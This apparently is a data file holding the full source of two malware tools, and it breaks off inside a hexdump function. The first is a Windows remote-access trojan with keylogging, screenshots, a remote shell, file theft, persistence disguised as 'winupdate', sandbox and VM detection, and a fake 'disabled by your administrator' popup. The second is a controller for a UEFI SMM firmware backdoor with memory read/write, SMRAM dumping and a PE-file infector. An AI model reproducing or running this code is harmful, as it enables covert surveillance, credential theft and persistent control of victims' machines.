client,"import socket, os, sys, platform, time, ctypes, subprocess, pyscreeze, threading, pynput.keyboard, wmi, json
import win32api, winerror, win32event
from shutil import copyfile
from winreg import *
from io import StringIO, BytesIO
from cryptography.fernet import Fernet

strHost = ""127.0.0.1""
# strHost = socket.gethostbyname("""")
intPort = 3000

strPath = os.path.realpath(sys.argv[0])  # get file path
TMP = os.environ[""TEMP""]  # get temp path
APPDATA = os.environ[""APPDATA""]
intBuff = 1024

blnMeltFile = False
blnAddToStartup = False

# function to prevent multiple instances
mutex = win32event.CreateMutex(None, 1, ""PA_mutex_xp4"")
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    sys.exit(0)


# function to move file to tmp dir and relaunch
def meltFile():
    winupdate = os.path.join(TMP, ""winupdate"")
    # ignore if the path is in appdata as well
    if not (os.getcwd() == winupdate) and not (os.getcwd() == APPDATA):
        # if folder already exists
        try:
            os.mkdir(winupdate)
        except:
            pass
        strNewFile = os.path.join(winupdate, os.path.basename(sys.argv[0]))

        strCommand = f""timeout 2 & move /y {os.path.realpath(sys.argv[0])} {strNewFile} & cd /d {winupdate}\\ & {strNewFile}""
        subprocess.Popen(strCommand, shell=True)
        sys.exit(0)


def detectSandboxie():
    try:
        ctypes.windll.LoadLibrary(""SbieDll.dll"")
    except Exception:
        return False
    return True


def detectVM():
    objWMI = wmi.WMI()
    for objDiskDrive in objWMI.query(""Select * from Win32_DiskDrive""):
        if ""vbox"" in objDiskDrive.Caption.lower() or ""virtual"" in objDiskDrive.Caption.lower():
            return True
    return False


def startup(onstartup):
    try:
        strAppPath = os.path.join(APPDATA, os.path.basename(strPath))
        if not os.getcwd() == APPDATA:
            copyfile(strPath, strAppPath)

        objRegKey = OpenKey(HKEY_CURRENT_USER, ""Software\\Microsoft\\Windows\\CurrentVersion\\Run"", 0, KEY_ALL_ACCESS)
        SetValueEx(objRegKey, ""winupdate"", 0, REG_SZ, strAppPath)
        CloseKey(objRegKey)
    except WindowsError:
        if not onstartup:
            send(b""Unable to add to startup!"")
    else:
        if not onstartup:
            send(b""success"")


def remove_from_startup():
    try:
        objRegKey = OpenKey(HKEY_CURRENT_USER, ""Software\\Microsoft\\Windows\\CurrentVersion\\Run"", 0, KEY_ALL_ACCESS)
        DeleteValue(objRegKey, ""winupdate"")
        CloseKey(objRegKey)
    except FileNotFoundError:
        send(b""Program is not registered in startup."")
    except WindowsError:
        send(b""Error removing value!"")
    else:
        send(b""success"")


def server_connect():
    global objSocket, objEncryptor
    while True:  # infinite loop until socket can connect
        try:
            objSocket = socket.socket()
            objSocket.connect((strHost, intPort))
        except socket.error:
            time.sleep(5)  # wait 5 seconds to try again
        else:
            break

    arrUserInfo = [socket.gethostname()]
    strPlatform = f""{platform.system()} {platform.release()}""
    if detectSandboxie():
        strPlatform += "" (Sandboxie) ""
    if detectVM():
        strPlatform += "" (Virtual Machine) ""
    arrUserInfo.extend([strPlatform, os.environ[""USERNAME""]])

    objSocket.send(json.dumps(arrUserInfo).encode())

    objEncryptor = Fernet(objSocket.recv(intBuff))


# function to receive data
recv = lambda buffer: objEncryptor.decrypt(objSocket.recv(buffer))

# function to send data
send = lambda data: objSocket.send(objEncryptor.encrypt(data))

if blnMeltFile: meltFile()
if blnAddToStartup: startup(True)

server_connect()


def OnKeyboardEvent(event):
    global strKeyLogs

    try:  # check to see if variable is defined
        strKeyLogs
    except NameError:
        strKeyLogs = """"

    if event == Key.backspace:
        strKeyLogs += "" [Bck] ""
    elif event == Key.tab:
        strKeyLogs += "" [Tab] ""
    elif event == Key.enter:
        strKeyLogs += ""\n""
    elif event == Key.space:
        strKeyLogs += "" ""
    elif type(event) == Key:  # if the character is some other type of special key
        strKeyLogs += f"" [{str(event)[4:]}] ""
    else:
        strKeyLogs += f""{event}""[1:len(str(event)) - 1]


KeyListener = pynput.keyboard.Listener(on_press=OnKeyboardEvent)
Key = pynput.keyboard.Key


def recvall(buffer):  # function to receive large amounts of data
    bytData = b""""
    while len(bytData) < buffer:
        bytData += objSocket.recv(buffer)
    return objEncryptor.decrypt(bytData)


def sendall(data):
    bytEncryptedData = objEncryptor.encrypt(data)
    intDataSize = len(bytEncryptedData)
    send(str(intDataSize).encode())
    time.sleep(0.2)
    objSocket.send(bytEncryptedData)


# vbs message box
def MessageBox(message):
    strScript = os.path.join(TMP, ""m.vbs"")
    with open(strScript, ""w"") as objVBS:
        objVBS.write(f'Msgbox ""{message}"", vbOKOnly+vbInformation+vbSystemModal, ""Message""')
    subprocess.Popen([""cscript"", strScript], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
                     shell=True)


def screenshot():
    # Take Screenshot
    objImage = pyscreeze.screenshot()
    # Create BytesIO Object as objBytes
    with BytesIO() as objBytes:
        # Save Screenshot into BytesIO Object
        objImage.save(objBytes, format=""PNG"")
        # Get BytesIO Object Data as bytes
        objPic = objBytes.getvalue()

    sendall(objPic)


def file_browser():
    arrRawDrives = win32api.GetLogicalDriveStrings()  # get list of drives
    arrRawDrives = arrRawDrives.split(""\000"")[:-1]

    strDrives = """"
    for drive in arrRawDrives:  # get proper view and place array into string
        strDrives += drive.replace(""\\"", """") + ""\n""
    send(strDrives.encode())

    strDir = recv(intBuff).decode()

    if os.path.isdir(strDir):
        if strDir[:-1] != ""\\"" or strDir[:-1] != ""/"":
            strDir += ""\\""
        arrFiles = os.listdir(strDir)

        strFiles = """"
        for file in arrFiles:
            strFiles += f""{file}\n""

        sendall(strFiles.encode())

    else:  # if the user entered an invalid directory
        send(b""Invalid Directory!"")
        return


def upload(data):
    intBuffer = int(data)
    file_data = recvall(intBuffer)
    strOutputFile = recv(intBuff).decode()

    try:
        with open(strOutputFile, ""wb"") as objFile:
            objFile.write(file_data)
        send(b""Done!"")
    except:
        send(b""Path is protected/invalid!"")


def receive(data):
    if not os.path.isfile(data):
        send(b""Target file not found!"")
        return

    with open(data, ""rb"") as objFile:
        sendall(objFile.read())  # Send Contents of File


def lock():
    ctypes.windll.user32.LockWorkStation()  # lock pc


def shutdown(shutdowntype):
    command = f""shutdown {shutdowntype} -f -t 30""
    subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
    objSocket.close()  # close connection and exit
    sys.exit(0)


def command_shell():
    strCurrentDir = os.getcwd()
    send(os.getcwdb())
    bytData = b""""

    while True:
        strData = recv(intBuff).decode()

        if strData == ""goback"":
            os.chdir(strCurrentDir)  # change directory back to original
            break

        elif strData[:2].lower() == ""cd"" or strData[:5].lower() == ""chdir"":
            objCommand = subprocess.Popen(strData + "" & cd"", stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                          stdin=subprocess.PIPE, shell=True)
            if objCommand.stderr.read().decode() == """":  # if there is no error
                strOutput = (objCommand.stdout.read()).decode().splitlines()[0]  # decode and remove new line
                os.chdir(strOutput)  # change directory

                bytData = f""\n{os.getcwd()}>"".encode()  # output to send the server

        elif len(strData) > 0:
            objCommand = subprocess.Popen(strData, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                          stdin=subprocess.PIPE, shell=True)
            strOutput = objCommand.stdout.read() + objCommand.stderr.read()  # since cmd uses bytes, decode it
            bytData = (strOutput + b""\n"" + os.getcwdb() + b"">"")
        else:
            bytData = b""Error!""

        sendall(bytData)  # send output


def python_interpreter():
    send(b""received"")
    while True:
        strCommand = recv(intBuff).decode()
        if strCommand == ""exit"":
            send(b""exiting"")
            break
        old_stdout = sys.stdout
        redirected_output = sys.stdout = StringIO()
        try:
            exec(strCommand)
            print()
            strError = None
        except Exception as e:
            strError = f""{e.__class__.__name__}: ""
            try:
                strError += f""{e.args[0]}""
            except:
                pass
        finally:
            sys.stdout = old_stdout

        if strError:
            sendall(strError.encode())
        else:
            sendall(redirected_output.getvalue().encode())


def vbs_block_process(process, popup=False):
    # VBScript to block process, this allows the script to disconnect from the original python process, check github rep for source
    # popup: list
    # [message, title, timeout, type]

    strVBSCode = ""On Error Resume Next\n"" + \
                 ""Set objWshShl = WScript.CreateObject(\""WScript.Shell\"")\n"" + \
                 ""Set objWMIService = GetObject(\""winmgmts:\"" & \""{impersonationLevel=impersonate}!//./root/cimv2\"")\n"" + \
                 ""Set colMonitoredProcesses = objWMIService.ExecNotificationQuery(\""select * "" \
                 ""from __instancecreationevent \"" & \"" within 1 where TargetInstance isa 'Win32_Process'\"")\n"" + \
                 ""Do"" + ""\n"" + ""Set objLatestProcess = colMonitoredProcesses.NextEvent\n"" + \
                 f""If LCase(objLatestProcess.TargetInstance.Name) = \""{process}\"" Then\n"" + \
                 ""objLatestProcess.TargetInstance.Terminate\n""
    if popup:  # if showing a message
        strVBSCode += f'objWshShl.Popup ""{popup[0]}"", {popup[2]}, ""{popup[1]}"", {popup[3]}\n'

    strVBSCode += ""End If\nLoop""

    strScript = os.path.join(TMP, ""d.vbs"")

    with open(strScript, ""w"") as objVBSFile:
        objVBSFile.write(strVBSCode)

    subprocess.Popen([""cscript"", strScript], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
                     shell=True)  # run the script


def disable_taskmgr():
    global blnDisabled
    if not blnDisabled:  # if task manager is already disabled, enable it
        send(b""Enabling ..."")

        subprocess.Popen([""taskkill"", ""/f"", ""/im"", ""cscript.exe""], stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                         stdin=subprocess.PIPE, shell=True)

        blnDisabled = True
    else:
        send(b""Disabling ..."")

        popup = [""Task Manager has been disabled by your administrator"", ""Task Manager"", ""3"", ""16""]

        vbs_block_process(""taskmgr.exe"", popup=popup)
        blnDisabled = False


def keylogger(option):
    global strKeyLogs

    if option == ""start"":
        if not KeyListener.running:
            KeyListener.start()
            send(b""success"")
        else:
            send(b""error"")

    elif option == ""stop"":
        if KeyListener.running:
            KeyListener.stop()
            threading.Thread.__init__(KeyListener)  # re-initialise the thread
            strKeyLogs = """"
            send(b""success"")
        else:
            send(b""error"")

    elif option == ""dump"":
        if not KeyListener.running:
            send(b""error"")
        else:
            if strKeyLogs == """":
                send(b""error2"")
            else:
                time.sleep(0.2)
                sendall(strKeyLogs.encode())
                strKeyLogs = """"  # clear logs


def run_command(command):
    bytLogOutput = b""\n""

    if len(command) > 0:
        objCommand = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
                                      shell=True)
        bytLogOutput += objCommand.stdout.read() + objCommand.stderr.read()
    else:
        bytLogOutput += b""Error!""

    sendall(bytLogOutput)


while True:
    try:
        while True:
            strData = recv(intBuff)
            strData = strData.decode()

            if strData == ""exit"":
                objSocket.close()
                sys.exit(0)
            elif strData[:3] == ""msg"":
                MessageBox(strData[3:])
            elif strData == ""startup"":
                startup(False)
            elif strData == ""rmvstartup"":
                remove_from_startup()
            elif strData == ""screen"":
                screenshot()
            elif strData == ""filebrowser"":
                file_browser()
            elif strData[:4] == ""send"":
                upload(strData[4:])
            elif strData[:4] == ""recv"":
                receive(strData[4:])
            elif strData == ""lock"":
                lock()
            elif strData == ""shutdown"":
                shutdown(""-s"")
            elif strData == ""restart"":
                shutdown(""-r"")
            elif strData == ""test"":
                continue
            elif strData == ""cmd"":
                command_shell()
            elif strData == ""python"":
                python_interpreter()
            elif strData == ""keystart"":
                keylogger(""start"")
            elif strData == ""keystop"":
                keylogger(""stop"")
            elif strData == ""keydump"":
                keylogger(""dump"")
            elif strData[:6] == ""runcmd"":
                run_command(strData[6:])
            elif strData == ""dtaskmgr"":
                if not ""blnDisabled"" in globals():  # if the variable doesnt exist yet
                    blnDisabled = True
                disable_taskmgr()
    except socket.error:  # if the server closes without warning
        objSocket.close()
        del objSocket
        server_connect()"
SmmBackdoor,"import sys, os, time, shutil, unittest, mmap
from ctypes import *
from struct import pack, unpack
from optparse import OptionParser, make_option


# SW SMI command value for communicating with backdoor SMM code
BACKDOOR_SW_SMI_VAL = 0xCC

# SW SMI commands for backdoor
BACKDOOR_SW_DATA_PING               = 0     # test for allive SMM backdoor
BACKDOOR_SW_DATA_READ_PHYS_PAGE     = 1     # read physical memory command
BACKDOOR_SW_DATA_READ_VIRT_PAGE     = 2     # read virtual memory command
BACKDOOR_SW_DATA_WRITE_PHYS_PAGE    = 3     # write physical memory command
BACKDOOR_SW_DATA_WRITE_VIRT_PAGE    = 4     # write virtual memory command
BACKDOOR_SW_DATA_TIMER_ENABLE       = 5     # enable periodic timer handler
BACKDOOR_SW_DATA_TIMER_DISABLE      = 6     # disable periodic timer handler
BACKDOOR_SW_DATA_CALL               = 7     # call specified subroutine
BACKDOOR_SW_DATA_READ_PHYS_DWORD    = 9     # read physical memory dowrd command
BACKDOOR_SW_DATA_READ_VIRT_DWORD    = 10    # read virtual memory dowrd command
BACKDOOR_SW_DATA_WRITE_PHYS_DWORD   = 11    # write physical memory dowrd command
BACKDOOR_SW_DATA_WRITE_VIRT_DWORD   = 12    # write virtual memory dowrd command

# See struct _INFECTOR_CONFIG in SmmBackdoor.h
INFECTOR_CONFIG_SECTION = '.conf'
INFECTOR_CONFIG_FMT = 'QI'
INFECTOR_CONFIG_LEN = 8 + 4

# IMAGE_DOS_HEADER.e_res magic constant to mark infected file
INFECTOR_SIGN = 'INFECTED'

# EFI variable with struct _BACKDOOR_INFO physical address
BACKDOOR_INFO_EFI_VAR = 'SmmBackdoorInfo-3a452e85-a7ca-438f-a5cb-ad3a70c5d01b'
BACKDOOR_INFO_FMT = 'QQQQQ'
BACKDOOR_INFO_LEN = 8 * 5

# idicate that SMRAM regions were copied to BACKDOOR_INFO structure
BACKDOOR_INFO_FULL = 0xFFFFFFFF

PAGE_SIZE = 0x1000

align_up = lambda x, a: ((x + a - 1) // a) * a
align_down = lambda x, a: (x // a) * a

cs = None


class ChipsecWrapper(object):

    def __init__(self):

        try:

            import chipsec.chipset
            import chipsec.hal.uefi
            import chipsec.hal.physmem
            import chipsec.hal.interrupts

        except ImportError:

            print('ERROR: chipsec is not installed')
            exit(-1)

        self.cs = chipsec.chipset.cs()
        
        # load chipsec helper
        self.cs.helper.start(True)
    
        # load needed sumbmodules
        self.intr = chipsec.hal.interrupts.Interrupts(self.cs)
        self.uefi = chipsec.hal.uefi.UEFI(self.cs)        
        self.mem = chipsec.hal.physmem.Memory(self.cs)

    def efi_var_get(self, name):

        # parse variable name string of name-GUID format
        name = name.split('-')

        # get variable data
        return self.uefi.get_EFI_variable(name[0], '-'.join(name[1: ]), None)

    efi_var_get_8 = lambda self, name: unpack('B', self.efi_var_get(name))[0]
    efi_var_get_16 = lambda self, name: unpack('H', self.efi_var_get(name))[0]
    efi_var_get_32 = lambda self, name: unpack('I', self.efi_var_get(name))[0]
    efi_var_get_64 = lambda self, name: unpack('Q', self.efi_var_get(name))[0]

    def mem_read(self, addr, size): 

        # read memory contents
        return self.mem.read_physical_mem(addr, size)

    def mem_write(self, addr, data): 

        # write memory contents
        return self.mem.write_physical_mem(addr, len(data), data)

    mem_read_8 = lambda self, addr: unpack('B', self.mem_read(addr, 1))[0]
    mem_read_16 = lambda self, addr: unpack('H', self.mem_read(addr, 2))[0]
    mem_read_32 = lambda self, addr: unpack('I', self.mem_read(addr, 4))[0]
    mem_read_64 = lambda self, addr: unpack('Q', self.mem_read(addr, 8))[0]

    mem_write_1 = lambda self, addr, v: self.mem_write(addr, pack('B', v))
    mem_write_2 = lambda self, addr, v: self.mem_write(addr, pack('H', v))
    mem_write_4 = lambda self, addr, v: self.mem_write(addr, pack('I', v))
    mem_write_8 = lambda self, addr, v: self.mem_write(addr, pack('Q', v))

    def send_sw_smi(self, command, data, arg):

        # fire synchronous SMI
        self.intr.send_SW_SMI(0, command, data, 0, 0, arg, 0, 0, 0)


def get_backdoor_info_addr():

    # get _BACKDOOR_INFO structure address
    return cs.efi_var_get_64(BACKDOOR_INFO_EFI_VAR)


def get_backdoor_info(addr = None):

    addr = get_backdoor_info_addr() if addr is None else addr

    # read _BACKDOOR_INFO structure contents
    return unpack(BACKDOOR_INFO_FMT, cs.mem_read(addr, BACKDOOR_INFO_LEN))


def get_backdoor_info_mem(addr = None, size = None):

    addr = get_backdoor_info_addr() if addr is None else addr
    size = PAGE_SIZE if size is None else size

    # read whole page to avoid caching issues (damn chipsec)
    data = cs.mem_read(addr + PAGE_SIZE, PAGE_SIZE)

    return data[: size]


def get_smram_info():

    ret = []  
    backdoor_info = get_backdoor_info_addr()  
    addr, size = backdoor_info + BACKDOOR_INFO_LEN, 8 * 4    

    # dump array of EFI_SMRAM_DESCRIPTOR structures
    while True:

        '''
            typedef struct _EFI_SMRAM_DESCRIPTOR 
            {
                EFI_PHYSICAL_ADDRESS PhysicalStart; 
                EFI_PHYSICAL_ADDRESS CpuStart; 
                UINT64 PhysicalSize; 
                UINT64 RegionState;
            } EFI_SMRAM_DESCRIPTOR;
        '''            
        physical_start, cpu_start, physical_size, region_state = unpack('Q' * 4, cs.mem_read(addr, size))            

        if physical_start == 0:

            # no more items
            break

        ret.append(( physical_start, physical_size, region_state ))
        addr += size

    return ret


def backdoor_ctl(code, arg):

    # send request to the backdoor
    cs.send_sw_smi(BACKDOOR_SW_SMI_VAL, code, arg)


def backdoor_read_virt_page(addr):

    assert addr & 0xfff == 0

    # read virtual memory page
    backdoor_ctl(BACKDOOR_SW_DATA_READ_VIRT_PAGE, addr)

    backdoor_info = get_backdoor_info_addr()

    # check status
    _, _, last_status, _, _ = get_backdoor_info(addr = backdoor_info)
    if last_status != 0:

        raise Exception('SMM backdoor error 0x%.8x' % last_status)
        
    # get contents
    return get_backdoor_info_mem(addr = backdoor_info)


def backdoor_read_phys_page(addr):

    assert addr & 0xfff == 0

    # read physical memory page
    backdoor_ctl(BACKDOOR_SW_DATA_READ_PHYS_PAGE, addr)

    backdoor_info = get_backdoor_info_addr()
        
    # check status
    _, _, last_status, _, _ = get_backdoor_info(addr = backdoor_info)
    if last_status != 0:

        raise Exception('SMM backdoor error 0x%.8x' % last_status)
        
    # get contents
    return get_backdoor_info_mem(addr = backdoor_info)


def backdoor_write_virt_page(addr, data):

    assert addr & 0xfff == 0
    assert len(data) == PAGE_SIZE

    cs.mem_write(get_backdoor_info_addr() + PAGE_SIZE, data)

    # write virtual memory page
    backdoor_ctl(BACKDOOR_SW_DATA_WRITE_VIRT_PAGE, addr)

    # check status
    _, _, last_status, _, _ = get_backdoor_info()
    if last_status != 0:

        raise Exception('SMM backdoor error 0x%.8x' % last_status)


def backdoor_write_phys_page(addr, data):

    assert addr & 0xfff == 0
    assert len(data) == PAGE_SIZE

    cs.mem_write(get_backdoor_info_addr() + PAGE_SIZE, data)

    # write physical memory page
    backdoor_ctl(BACKDOOR_SW_DATA_WRITE_PHYS_PAGE, addr)

    # check status
    _, _, last_status, _, _ = get_backdoor_info()
    if last_status != 0:

        raise Exception('SMM backdoor error 0x%.8x' % last_status)


def backdoor_read_virt_dword(addr):

    assert (addr & 0xfff) + 4 <= 0x1000

    # read virtual memory dword
    backdoor_ctl(BACKDOOR_SW_DATA_READ_VIRT_DWORD, addr)

    backdoor_info = get_backdoor_info_addr()

    # check status
    _, _, last_status, _, _ = get_backdoor_info(addr = backdoor_info)
    if last_status != 0:

        raise Exception('SMM backdoor error 0x%.8x' % last_status)
        
    # get contents
    return get_backdoor_info_mem(addr = backdoor_info, size = 4)


def backdoor_read_phys_dword(addr):

    assert (addr & 0xfff) + 4 <= 0x1000

    # read physical memory dword
    backdoor_ctl(BACKDOOR_SW_DATA_READ_PHYS_DWORD, addr)

    backdoor_info = get_backdoor_info_addr()

    # check status
    _, _, last_status, _, _ = get_backdoor_info(addr = backdoor_info)
    if last_status != 0:

        raise Exception('SMM backdoor error 0x%.8x' % last_status)
        
    # get contents
    return get_backdoor_info_mem(addr = backdoor_info, size = 4)


def backdoor_write_virt_dword(addr, data):

    assert (addr & 0xfff) + 4 <= 0x1000
    assert len(data) == 4

    cs.mem_write(get_backdoor_info_addr() + PAGE_SIZE, data)

    # write virtual memory dword
    backdoor_ctl(BACKDOOR_SW_DATA_WRITE_VIRT_DWORD, addr)

    # check status
    _, _, last_status, _, _ = get_backdoor_info()
    if last_status != 0:

        raise Exception('SMM backdoor error 0x%.8x' % last_status)


def backdoor_write_phys_dword(addr, data):

    assert (addr & 0xfff) + 4 <= 0x1000
    assert len(data) == 4

    cs.mem_write(get_backdoor_info_addr() + PAGE_SIZE, data)

    # write physical memory dword
    backdoor_ctl(BACKDOOR_SW_DATA_WRITE_PHYS_DWORD, addr)

    # check status
    _, _, last_status, _, _ = get_backdoor_info()
    if last_status != 0:

        raise Exception('SMM backdoor error 0x%.8x' % last_status)


def backdoor_timer_enable():

    # enable periodic timer SMI handler
    backdoor_ctl(BACKDOOR_SW_DATA_TIMER_ENABLE, 0)
        

def backdoor_timer_disable():

    # disable periodic timer SMI handler
    backdoor_ctl(BACKDOOR_SW_DATA_TIMER_DISABLE, 0)


def backdoor_call(addr):

    # call specified subroutine
    backdoor_ctl(BACKDOOR_SW_DATA_CALL, addr)


def _backdoor_read_mem(addr, size, virt = False):

    align, data = 4, ''

    read_addr = align_down(addr, align)
    read_size = align_up(size, align) + align

    ptr = addr - read_addr

    # perform memory reads
    for i in range(0, read_size / align):
        
        if virt:

            data += backdoor_read_virt_dword(read_addr + (i * align))

        else:

            data += backdoor_read_phys_dword(read_addr + (i * align))

    # align memory read request by 4 byte boundary
    return data[ptr : ptr + size]


def _backdoor_write_mem(addr, data, virt = False):

    align, size = 4, len(data)

    write_addr = align_down(addr, align)
    write_size = align_up(size, align) + align

    # read existing data
    write_data = _backdoor_read_mem(write_addr, write_size, virt = virt)

    ptr = addr - write_addr

    # align memory write request by 4 byte boundary
    data = write_data[: ptr] + data + write_data[ptr + size :]

    for i in range(0, write_size / align):

        if virt:

            backdoor_write_virt_dword(write_addr + (i * align), data[i * align : (i + 1) * align])

        else:

            backdoor_write_phys_dword(write_addr + (i * align), data[i * align : (i + 1) * align])


read_phys_mem = lambda addr, size: _backdoor_read_mem(addr, size, virt = False)
read_virt_mem = lambda addr, size: _backdoor_read_mem(addr, size, virt = True)

write_phys_mem = lambda addr, data: _backdoor_write_mem(addr, data, virt = False)
write_virt_mem = lambda addr, data: _backdoor_write_mem(addr, data, virt = True)


write_phys_mem_1 = lambda addr, v: write_phys_mem(addr, pack('B', v))
write_phys_mem_2 = lambda addr, v: write_phys_mem(addr, pack('H', v))
write_phys_mem_4 = lambda addr, v: write_phys_mem(addr, pack('I', v))
write_phys_mem_8 = lambda addr, v: write_phys_mem(addr, pack('Q', v))

write_virt_mem_1 = lambda addr, v: write_virt_mem(addr, pack('B', v))
write_virt_mem_2 = lambda addr, v: write_virt_mem(addr, pack('H', v))
write_virt_mem_4 = lambda addr, v: write_virt_mem(addr, pack('I', v))
write_virt_mem_8 = lambda addr, v: write_virt_mem(addr, pack('Q', v))


read_phys_mem_1 = lambda addr: unpack('B', read_phys_mem(addr, 1))[0]
read_phys_mem_2 = lambda addr: unpack('H', read_phys_mem(addr, 2))[0]
read_phys_mem_4 = lambda addr: unpack('I', read_phys_mem(addr, 4))[0]
read_phys_mem_8 = lambda addr: unpack('Q', read_phys_mem(addr, 8))[0]

read_virt_mem_1 = lambda addr: unpack('B', read_virt_mem(addr, 1))[0]
read_virt_mem_2 = lambda addr: unpack('H', read_virt_mem(addr, 2))[0]
read_virt_mem_4 = lambda addr: unpack('I', read_virt_mem(addr, 4))[0]
read_virt_mem_8 = lambda addr: unpack('Q', read_virt_mem(addr, 8))[0]


def dump_mem_page(addr, count = None):

    ret = ''
    backdoor_info = get_backdoor_info_addr()
    count = 1 if count is None else count    

    for i in range(count):

        # send read memory page command to SMM code
        page_addr = addr + PAGE_SIZE * i
        backdoor_ctl(BACKDOOR_SW_DATA_READ_PHYS_PAGE, page_addr)

        _, _, last_status, _, _ = get_backdoor_info(addr = backdoor_info)
        if last_status != 0:

            raise Exception('SMM backdoor error 0x%.8x' % last_status)

        # copy readed page contents from physical memory
        ret += get_backdoor_info_mem(addr = backdoor_info)

    return ret


def dump_smram():        

    # get backdoor status
    info_addr = get_backdoor_info_addr()
    _, _, last_status, _, _ = get_backdoor_info(addr = info_addr)

    # get SMRAM information
    regions, contents = get_smram_info(), []
    regions_merged = []

    if len(regions) > 1:

        # join neighbour regions
        for i in range(0, len(regions) - 1):

            curr_addr, curr_size, curr_opt = regions[i]
            next_addr, next_size, next_opt = regions[i + 1]

            if curr_addr + curr_size == next_addr:

                # join two regions
                regions[i + 1] = ( curr_addr, curr_size + next_size, curr_opt )

            else:

                # copy region information
                regions_merged.append(( curr_addr, curr_size, curr_opt ))

        region_addr, region_size, region_opt = regions[-1]
        regions_merged.append(( region_addr, region_size, region_opt ))

    elif len(regions) > 0:

        regions_merged = regions

    else:

        raise(Exception('No SMRAM regions found'))

    print('[+] Dumping SMRAM regions, this may take a while...')

    try:

        ptr = PAGE_SIZE

        # enumerate and dump available SMRAM regions
        for region in regions_merged: 
            
            region_addr, region_size, _ = region            
            name = 'SMRAM_dump_%.8x_%.8x.bin' % (region_addr, region_addr + region_size - 1)

            if last_status == BACKDOOR_INFO_FULL:

                # dump region contents from BACKDOOR_INFO structure
                data = cs.mem_read(info_addr + ptr, region_size)
                ptr += region_size

            else:

                # dump region contents with sending SW SMI to SMM backdoor
                data = dump_mem_page(region_addr, region_size / PAGE_SIZE)

            contents.append(( name, data ))

        # save dumped data to files
        for name, data in contents:

            with open(name, 'wb') as fd:

                print('[+] Creating %s' % name)
                fd.write(data) 

    except IOError, why:

        print('ERROR: %s' % str(why))
        return False


def check_system():    

    try:

        backdoor_ctl(BACKDOOR_SW_DATA_PING, 0x31337)

        backdoor_info = get_backdoor_info_addr()
        print('[+] struct _BACKDOOR_INFO physical address is 0x%x' % backdoor_info)

        calls_count, ticks_count, last_status, smm_mca_cap, smm_feature_control = \
            get_backdoor_info(addr = backdoor_info)

        print('[+] BackdoorEntry() calls count is %d' % calls_count)
        print('[+] PeriodicTimerDispatch2Handler() calls count is %d' % ticks_count)
        print('[+] Last status code is 0x%.8x' % last_status)
        print('[+] MSR_SMM_MCA_CAP register value is 0x%x' % smm_mca_cap)
        print('[+] MSR_SMM_FEATURE_CONTROL register value is 0x%x' % smm_feature_control)

        print('[+] SMRAM map:')

        # enumerate available SMRAM regions
        for region in get_smram_info():        
        
            physical_start, physical_size, region_state = region 

            print('    address = 0x%.8x, size = 0x%.8x, state = 0x%x' % \
                  (physical_start, physical_size, region_state))

        return True

    except IOError, why:

        print('ERROR: %s' % str(why))
        return False


def infect(src, payload, dst = None):

    try:

        import pefile

    except ImportError:

        print('ERROR: pefile is not installed')
        exit(-1)

    def _infector_config_offset(pe):
        
        for section in pe.sections:

            # find .conf section of payload image
            if section.Name[: len(INFECTOR_CONFIG_SECTION)] == INFECTOR_CONFIG_SECTION:

                return section.PointerToRawData

        raise Exception('Unable to find %s section' % INFECTOR_CONFIG_SECTION)

    def _infector_config_get(pe, data):

        offs = _infector_config_offset(pe)
        
        return unpack(INFECTOR_CONFIG_FMT, data[offs : offs + INFECTOR_CONFIG_LEN])        

    def _infector_config_set(pe, data, *args):

        offs = _infector_config_offset(pe)

        return data[: offs] + \
               pack(INFECTOR_CONFIG_FMT, *args) + \
               data[offs + INFECTOR_CONFIG_LEN :]

    # load target image
    pe_src = pefile.PE(src)

    # load payload image
    pe_payload = pefile.PE(payload)
    
    if pe_src.DOS_HEADER.e_res == INFECTOR_SIGN:

        raise Exception('%s is already infected' % src)        

    if pe_src.FILE_HEADER.Machine != pe_payload.FILE_HEADER.Machine:

        raise Exception('Architecture missmatch')

    # read payload image data into the string
    data = open(payload, 'rb').read()

    # read _INFECTOR_CONFIG, this structure is located at .conf section of payload image
    conf_ep_new, conf_ep_old = _infector_config_get(pe_payload, data) 

    last_section = None
    for section in pe_src.sections:

        # find last section of target image
        last_section = section

    if last_section.Misc_VirtualSize > last_section.SizeOfRawData:

        raise Exception('Last section virtual size must be less or equal than raw size')

    # save original entry point address of target image
    conf_ep_old = pe_src.OPTIONAL_HEADER.AddressOfEntryPoint

    print('Original entry point RVA is 0x%.8x' % conf_ep_old )
    print('Original %s virtual size is 0x%.8x' % \
          (last_section.Name.split('\0')[0], last_section.Misc_VirtualSize))

    print('Original image size is 0x%.8x' % pe_src.OPTIONAL_HEADER.SizeOfImage)

    # write updated _INFECTOR_CONFIG back to the payload image
    data = _infector_config_set(pe_payload, data, conf_ep_new, conf_ep_old)

    # set new entry point of target image
    pe_src.OPTIONAL_HEADER.AddressOfEntryPoint = \
        last_section.VirtualAddress + last_section.SizeOfRawData + conf_ep_new    

    # update last section size
    last_section.SizeOfRawData += len(data)
    last_section.Misc_VirtualSize = last_section.SizeOfRawData

    # make it executable
    last_section.Characteristics = pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_READ'] | \
                                   pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_WRITE'] | \
                                   pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_EXECUTE']  

    print('Characteristics of %s section was changed to RWX' % last_section.Name.split('\0')[0])

    # update image headers
    pe_src.OPTIONAL_HEADER.SizeOfImage = last_section.VirtualAddress + last_section.Misc_VirtualSize
    pe_src.DOS_HEADER.e_res = INFECTOR_SIGN    

    print('New entry point RVA is 0x%.8x' % pe_src.OPTIONAL_HEADER.AddressOfEntryPoint)
    print('New %s virtual size is 0x%.8x' % \
          (last_section.Name.split('\0')[0], last_section.Misc_VirtualSize))

    print('New image size is 0x%.8x' % pe_src.OPTIONAL_HEADER.SizeOfImage)

    # get infected image data
    data = pe_src.write() + data

    if dst is not None:

        with open(dst, 'wb') as fd:

            # save infected image to the file
            fd.write(data)

    return data


def hexdump(data, width = 16, addr = 0):

